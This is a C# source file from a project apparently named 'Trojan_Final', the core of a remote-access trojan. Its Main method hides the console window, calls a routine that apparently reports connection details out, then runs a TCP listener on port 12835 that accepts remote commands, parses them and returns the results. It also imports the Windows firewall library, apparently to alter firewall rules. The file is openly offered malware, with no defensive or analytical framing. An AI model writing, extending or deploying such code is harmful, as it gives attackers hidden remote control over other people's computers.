using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using NetFwTypeLib;


namespace Trojan_Final
{
    public class TCPLIstener : TcpListener
    {
        public TCPLIstener(IPAddress ip, int port) : base(ip,port)
        {

        }

        public bool GetActive()
        {
            return this.Active;
        }
    }

    class Program
    {
        static async Task<string> ListenTCP()
        {
            IPAddress ipaddr = IPAddress.Parse(NetworkDiscover.GetAllLocalIPv4(NetworkInterfaceType.Wireless80211).FirstOrDefault());
            Console.WriteLine("Listening...");
            int portNumber = 12835;

            TCPLIstener tcp = new TCPLIstener(ipaddr,portNumber);
            
            if(!tcp.GetActive())
                tcp.Start();

            Console.WriteLine(ipaddr.ToString());

            
            while (true)
            {
                Socket client = tcp.AcceptSocket();
                Console.WriteLine("Connection accepted");


                var childSocketThread = new Thread(() =>
                {
                    byte[] data = new byte[2000];
                    int size = client.Receive(data);

                    Console.WriteLine("Recieved data: ");
                    var comanda = Encoding.ASCII.GetString(data);
                    Console.WriteLine(comanda);
                    Console.WriteLine();

                    var response = CommandParse.Parse(comanda);
                    byte[] responseData = Encoding.ASCII.GetBytes(response);
                    client.Send(responseData);


                    client.Close();
                });

                childSocketThread.Start();
            }
        }



        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            // Hide
            ShowWindow(handle, SW_HIDE);

            NetworkDiscover.SendConnectionInfo().GetAwaiter().GetResult();
            ListenTCP().GetAwaiter().GetResult();



            Console.ReadLine();
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
    }
   
}
